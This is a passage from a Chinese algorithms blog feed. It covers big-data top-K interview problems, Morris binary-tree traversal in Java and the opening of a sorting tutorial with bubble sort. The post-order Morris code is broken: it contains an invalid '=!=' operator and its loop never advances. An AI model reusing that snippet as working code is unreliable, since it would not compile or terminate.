title="题目二"></a>题目二</h2><p><strong>问题</strong></p><p>有一个1G大小的一个文件，里面每一行是一个词，词的大小不超过16字节，内存限制大小是1M，要求返回频数最高的100个词。<br><strong>解题思路</strong></p><p>Step1：顺序读文件中，对于每个词x，取hash(x)%5000，然后按照该值存到5000个小文件（记为f0 ,f1 ,… ,f4999）中，这样每个文件大概是200k左右，如果其中的有的文件超过了1M大小，还可以按照类似的方法继续往下分，直到分解得到的小文件的大小都不超过1M；</p><p>Step2：对每个小文件，统计每个文件中出现的词以及相应的频率（可以采用trie树/hash_map等），并取出出现频率最大的100个词（可以用含100个结点的最小堆），并把100词及相应的频率存入文件，这样又得到了5000个文件；</p><p>Step3：把这5000个文件进行归并（类似与归并排序）；</p><p>草图如下（分割大问题，求解小问题，归并）：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/bigdata/2.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/bigdata/2.png" alt="img"></a></p><h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><p><strong>问题</strong></p><p>现有海量日志数据保存在一个超级大的文件中，该文件无法直接读入内存，要求从中提取某天出访问百度次数最多的那个IP。<br><strong>解题思路</strong></p><p>Step1：从这一天的日志数据中把访问百度的IP取出来，逐个写入到一个大文件中；</p><p>Step2：注意到IP是32位的，最多有2^32个IP。同样可以采用映射的方法，比如模1000，把整个大文件映射为1000个小文件；</p><p>Step3：找出每个小文中出现频率最大的IP（可以采用hash_map进行频率统计，然后再找出频率最大的几个）及相应的频率；</p><p>Step4：在这1000个最大的IP中，找出那个频率最大的IP，即为所求。</p><p>草图如下：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/bigdata/3.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/bigdata/3.png" alt="img"></a></p><p>本文转载自:  <a href="https://www.cnblogs.com/CheeseZH/p/5283390.html" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树的Morris神级遍历算法</title>
      <link href="/2019/01/04/suan-fa/er-cha-shu/er-cha-shu-de-morris-shen-ji-bian-li-suan-fa/"/>
      <url>/2019/01/04/suan-fa/er-cha-shu/er-cha-shu-de-morris-shen-ji-bian-li-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树的Morris神级遍历算法"><a href="#二叉树的Morris神级遍历算法" class="headerlink" title="二叉树的Morris神级遍历算法"></a>二叉树的Morris神级遍历算法</h2><p>对二叉树节点的遍历一般来说有中序，后序，和前序三种遍历方法，如果二叉树的高用h来表示，那三种遍历方法所需要的空间复杂度为O(h). 例如对于中序遍历来说，如果我们使用递归来实现的话，代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">inorderTraval</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">inorderTraval</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">inorderTraval</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上面的实现中，有函数的递归调用，递归的深度等于二叉树的高度，也就是说递归导致的调用堆栈的高度等于二叉树的高度，这样的话，程序虽然没有显示的通过new 来分配内存，但实际上消耗的内存大小也是 O(h). 如果二叉树的高度很大，例如搜索引擎把几十亿张网页按照权重来组成二叉树的话，那么二叉树的高度也要几十万作用，因此按照传统的中序遍历，需要消耗大量的内存。</p><p>本节要讲的Morris遍历法，能以O(1)的空间复杂度实现二叉树的中序遍历。例如给定下面二叉树：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/morris算法/1.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/morris算法/1.png" alt="img"></a></p><p>这里写图片描述</p><p>采用中序遍历的话，二叉树节点的访问情况如下：</p><p>1，2，3，4，5，6，7，8，9，10</p><p>给定某个节点，在中序遍历中，直接排在它前面的节点，我们称之为该节点的前序节点，例如节点5的前序节点就是4，同理，节点10的前序节点就是9.</p><p>在二叉树中如何查找一个节点的前序节点呢？如果该节点有左孩子，那么从左孩子开始，沿着右孩子指针一直想有走到底，得到的节点就是它的前序节点，例如节点6的左孩子是4，沿着节点4的右指针走到底，那就是节点5，节点9的左孩子是7，沿着它的右指针走到底对应的节点就是8.</p><p>如果左孩子的右节点指针是空，那么左孩子就是当前节点的前序节点。</p><p>如果当前节点没有左孩子，并且它是其父节点的右孩子，那么它的前序节点就是它的父节点，例如8的前序节点是7，10的前序节点是9.</p><p>如果当前节点没有左孩子，并且它是父节点的左孩子，那么它没有前序节点，并且它自己就是首节点，例如节点1.</p><p>值得注意的是，前序节点的右指针一定是空的。</p><p>Morris遍历算法的步骤如下：</p><p>1， 根据当前节点，找到其前序节点，如果前序节点的右孩子是空，那么把前序节点的右孩子指向当前节点，然后进入当前节点的左孩子。</p><p>2， 如果当前节点的左孩子为空，打印当前节点，然后进入右孩子。</p><p>3，如果当前节点的前序节点其右孩子指向了它本身，那么把前序节点的右孩子设置为空，打印当前节点，然后进入右孩子。</p><p>我们以上面的例子走一遍。首先访问的是根节点6，得到它的前序节点是5，此时节点5的右孩子是空，所以把节点5的右指针指向节点6：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/morris算法/2.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/morris算法/2.png" alt="img"></a></p><p>这里写图片描述</p><p>进入左孩子，也就到了节点4，此时节点3的前序节点3，右孩子指针是空，于是节点3的右孩子指针指向节点4，然后进入左孩子，也就是节点2</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/morris算法/3.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/morris算法/3.png" alt="img"></a></p><p>这里写图片描述</p><p>此时节点2的左孩子1没有右孩子，因此1就是2的前序节点，并且节点1的右孩子指针为空，于是把1的右孩子指针指向节点2，然后从节点2进入节点1：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/morris算法/4.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/morris算法/4.png" alt="img"></a></p><p>这里写图片描述</p><p>此时节点1没有左孩子，因此打印它自己的值，然后进入右孩子，于是回到节点2.根据算法步骤，节点2再次找到它的前序节点1，发现前序节点1的右指针已经指向它自己了，所以打印它自己的值，同时把前序节点的右孩子指针设置为空，同时进入右孩子，也就是节点3.于是图形变为：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/morris算法/5.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/morris算法/5.png" alt="img"></a></p><p>这里写图片描述</p><p>此时节点3没有左孩子，因此打印它自己的值，然后进入它的右孩子，也就是节点4. 到了节点4后，根据算法步骤，节点4先获得它的前序节点，也就是节点3，发现节点3的右孩子节点已经指向自己了，所以打印它自己的值，也就是4，然后把前序节点的右指针设置为空，于是图形变成：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/morris算法/6.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/morris算法/6.png" alt="img"></a></p><p>这里写图片描述</p><p>接着从节点4进入右孩子，也就是节点5，此时节点5没有左孩子，所以直接打印它本身的值，然后进入右孩子，也就是节点6，根据算法步骤，节点6获得它的前序节点5，发现前序节点的右指针已经指向了自己，于是就打印自己的值，把前序节点的右指针设置为空，然后进入右孩子。</p><p>接下来的流程跟上面一样，就不再重复了。</p><h3 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MorrisTraval</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> TreeNode root <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">MorrisTraval</span><span class="token punctuation">(</span>TreeNode r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>root <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">travel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode n <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>root<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>left <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>vaule <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> n<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                TreeNode pre <span class="token operator">=</span> <span class="token function">getPredecessor</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>pre<span class="token punctuation">.</span>right <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    pre<span class="token punctuation">.</span>right <span class="token operator">=</span> n<span class="token punctuation">;</span>                    n <span class="token operator">=</span> n<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pre<span class="token punctuation">.</span>right <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    pre<span class="token punctuation">.</span>right <span class="token operator">=</span> null<span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>vaule <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    n <span class="token operator">=</span> n<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> TreeNode <span class="token function">getPredecessor</span><span class="token punctuation">(</span>TreeNode n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode pre <span class="token operator">=</span> n<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            pre <span class="token operator">=</span> pre<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>pre<span class="token punctuation">.</span>right <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> pre<span class="token punctuation">.</span>right <span class="token operator">!=</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                pre <span class="token operator">=</span> pre<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>getPredecessor 作用是获得给定节点的前序节点，travel  接口做的就是前面描述的算法步骤，在while循环中，进入一个节点时，先判断节点是否有左孩子，没有的话就把节点值打印出来，有的话，先获得前序节点，然后判断前序节点的右孩子指针是否指向自己，是的话把自己的值打印出来，进入右孩子，前序孩子的右孩子指针是空的话，就把右孩子指针指向自己，然后进入左孩子。</p><p>Morris遍历，由于要把前缀节点的右指针指向自己，所以暂时会改变二叉树的结构，但在从前缀节点返回到自身时，算法会把前缀节点的右指针重新设置为空，所以二叉树在结构改变后，又会更改回来。</p><p>在遍历过程中，每个节点最多会被访问两次，一次是从父节点到当前节点，第二次是从前缀节点的右孩子指针返回当前节点，所以Morris遍历算法的复杂度是O(n)。在遍历过程中，没有申请新内存，因此算法的空间复杂度是O(1).</p><h3 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h3><p>前序遍历与中序遍历代码基本一致，只是在打印的地方不一样。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MorrisTraval</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> TreeNode root <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">MorrisTraval</span><span class="token punctuation">(</span>TreeNode r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>root <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">travel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode n <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>root<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>left <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>vaule <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> n<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                TreeNode pre <span class="token operator">=</span> <span class="token function">getPredecessor</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>pre<span class="token punctuation">.</span>right <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    pre<span class="token punctuation">.</span>right <span class="token operator">=</span> n<span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>vaule <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    n <span class="token operator">=</span> n<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pre<span class="token punctuation">.</span>right <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    pre<span class="token punctuation">.</span>right <span class="token operator">=</span> null<span class="token punctuation">;</span>                    n <span class="token operator">=</span> n<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> TreeNode <span class="token function">getPredecessor</span><span class="token punctuation">(</span>TreeNode n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode pre <span class="token operator">=</span> n<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            pre <span class="token operator">=</span> pre<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>pre<span class="token punctuation">.</span>right <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> pre<span class="token punctuation">.</span>right <span class="token operator">!=</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                pre <span class="token operator">=</span> pre<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h3><p>后续遍历逻辑就复杂很多，我贴下代码有兴趣的可以推导看看。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Morris</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">morrisPos</span><span class="token punctuation">(</span>Node head<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Node curr1 <span class="token operator">=</span> head<span class="token punctuation">;</span>        Node curr2 <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>curr1 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            curr2 <span class="token operator">=</span> curr1<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>curr2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>curr2<span class="token punctuation">.</span>right <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> curr2<span class="token punctuation">.</span>right <span class="token operator">=</span><span class="token operator">!=</span>curr1<span class="token punctuation">)</span><span class="token punctuation">{</span>                    curr2 <span class="token operator">=</span> curr2<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>curr2<span class="token punctuation">.</span>right <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    curr2<span class="token punctuation">.</span>right <span class="token operator">=</span> curr1<span class="token punctuation">;</span>                    curr1 <span class="token operator">=</span> curr1<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    curr2<span class="token punctuation">.</span>right <span class="token operator">=</span> null<span class="token punctuation">;</span>                    <span class="token function">printEdge</span><span class="token punctuation">(</span>curr1<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printEdge</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">printEdge</span><span class="token punctuation">(</span>Node head<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Node tail <span class="token operator">=</span> <span class="token function">reverseEdge</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        Node cur <span class="token operator">=</span> tail<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">reverseEdge</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Node <span class="token function">reverseEdge</span><span class="token punctuation">(</span>Node from<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Node pre <span class="token operator">=</span> null<span class="token punctuation">;</span>        Node next <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>from <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            next <span class="token operator">=</span> from<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            from<span class="token punctuation">.</span>right <span class="token operator">=</span> pre<span class="token punctuation">;</span>            pre <span class="token operator">=</span> from<span class="token punctuation">;</span>            from <span class="token operator">=</span> next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>转载链接：<a href="https://www.jianshu.com/p/484f587c967c" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大经典排序算法动画与解析（配代码完全版）</title>
      <link href="/2019/01/01/suan-fa/pai-xu/shi-da-jing-dian-pai-xu-suan-fa-dong-hua-yu-jie-xi-pei-dai-ma-wan-quan-ban/"/>
      <url>/2019/01/01/suan-fa/pai-xu/shi-da-jing-dian-pai-xu-suan-fa-dong-hua-yu-jie-xi-pei-dai-ma-wan-quan-ban/</url>
      
        <content type="html"><![CDATA[<h2 id="十大经典排序算法动画与解析（配代码完全版）"><a href="#十大经典排序算法动画与解析（配代码完全版）" class="headerlink" title="十大经典排序算法动画与解析（配代码完全版）"></a>十大经典排序算法动画与解析（配代码完全版）</h2><p><strong>排序算法是《数据结构与算法》中最基本的算法之一。</strong></p><p>排序算法可以分为<strong>内部排序</strong>和<strong>外部排序</strong>。</p><p>内部排序是数据记录在内存中进行排序。</p><p>而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。</p><p>常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。</p><p>用一张图概括：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/summary.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/summary.png" alt="img"></a>时间复杂度与空间复杂度</p><h4 id="关于时间复杂度："><a href="#关于时间复杂度：" class="headerlink" title="关于时间复杂度："></a>关于时间复杂度：</h4><ol><li>平方阶 (O(n2)) 排序 各类简单排序：直接插入、直接选择和冒泡排序。</li><li>线性对数阶 (O(nlog2n)) 排序 快速排序、堆排序和归并排序；</li><li>O(n1+§)) 排序，§ 是介于 0 和 1 之间的常数。 希尔排序</li><li>线性阶 (O(n)) 排序 基数排序，此外还有桶、箱排序。</li></ol><h4 id="关于稳定性："><a href="#关于稳定性：" class="headerlink" title="关于稳定性："></a>关于稳定性：</h4><ol><li>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序。</li><li>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序。</li></ol><h3 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1. 冒泡排序"></a>1. 冒泡排序</h3><h4 id="1-1-算法步骤"><a href="#1-1-算法步骤" class="headerlink" title="1.1 算法步骤"></a>1.1 算法步骤</h4><ul><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li></ul><h4 id="1-2-动画演示"><a href="#1-2-动画演示" class="headerlink" title="1.2 动画演示"></a>1.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/冒泡排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/冒泡排序.gif" alt="img"></a>冒泡排序动画演示</p><h4 id="1-3-参考代码"><a href="#1-3-参考代码" class="headerlink" title="1.3 参考代码"></a>1.3 参考代码</h4><pre class=" language-java"><code class="language-java"> <span class="token comment" spellcheck="true">// Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BubbleSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 设定一个标记，若为true，则表示此次循环没有进行交换，也就是待排序列已经有序，排序已经完成。</span>            <span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>                    flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2. 选择排序"></a>2. 选择排序</h3><h4 id="2-1-算法步骤"><a href="#2-1-算法步骤" class="headerlink" title="2.1 算法步骤"></a>2.1 算法步骤</h4><ul><li>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置</li><li>再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。</li><li>重复第二步，直到所有元素均排序完毕。</li></ul><h4 id="2-2-动画演示"><a href="#2-2-动画演示" class="headerlink" title="2.2 动画演示"></a>2.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/选择排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/选择排序.gif" alt="img"></a>选择排序动画演示</p><h4 id="2-3-参考代码"><a href="#2-3-参考代码" class="headerlink" title="2.3 参考代码"></a>2.3 参考代码</h4><pre 